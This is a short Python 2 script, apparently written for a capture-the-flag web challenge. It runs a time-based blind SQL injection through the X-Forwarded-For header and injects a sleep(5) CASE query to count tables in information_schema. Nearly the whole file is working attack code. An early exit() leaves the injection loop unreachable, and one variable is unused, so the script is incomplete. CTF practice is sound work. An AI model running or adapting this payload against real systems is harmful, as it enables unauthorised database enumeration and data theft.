# -*- coding:utf-8 -*-  
import requests
import string 
url = "http://ctf5.shiyanbar.com/web/wonderkun/index.php"
guess = string.lowercase+string.uppercase+string.digits+string.punctuation
pun=string.punctuation
print "low:",string.lowercase
print "upp:",string.uppercase
print "digit:",string.digits
print "pun:",pun
exit()
database=[]

for table_number in range(0,500):   
    print 'trying',table_number
    headers = {"X-forwarded-for":"'+"+" (select case when (select count(table_name) from information_schema.TABLES ) ='%d' then sleep(5) else 1 end) and '1'='1"%(table_number)}
    try:
        res=requests.get(url,headers=headers,timeout=4)
    except:
        print table_number
        break